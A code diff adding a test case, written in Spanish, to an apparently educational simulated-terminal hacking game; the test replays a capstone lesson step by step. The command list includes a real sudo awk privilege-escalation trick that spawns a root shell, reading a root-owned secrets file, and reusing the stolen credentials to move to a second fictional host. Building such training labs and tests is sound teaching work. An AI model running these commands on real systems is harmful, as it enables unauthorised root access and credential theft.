@@ -57,4 +57,22 @@ describe("Lecciones nuevas — completables con salida real", () => {
     const o2 = term.execute("cat /root/flag.txt");
     expect(steps[2].check!("cat /root/flag.txt", o2)).toBe(true);
   });
+
+  it("l-yvytu: la cadena capstone completa pasa cada check (paso a paso, motor real)", () => {
+    const steps = lesson("l-yvytu").steps;
+    const cmds = [
+      "connect deploy.yvytu.nande ci Deploy2024",
+      "cat /home/ci/user.txt",
+      "sudo -l",
+      "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
+      "cat /root/deploy.env",
+      "connect artefactos.yvytu.nande deployer Art3f@cts!2024",
+      "cat /root/flag.txt",
+    ];
+    expect(cmds.length).toBe(steps.length);
+    cmds.forEach((cmd, i) => {
+      const out = term.execute(cmd);
+      expect(steps[i].check!(cmd, out), `paso ${i}: ${cmd}`).toBe(true);
+    });
+  });
 });
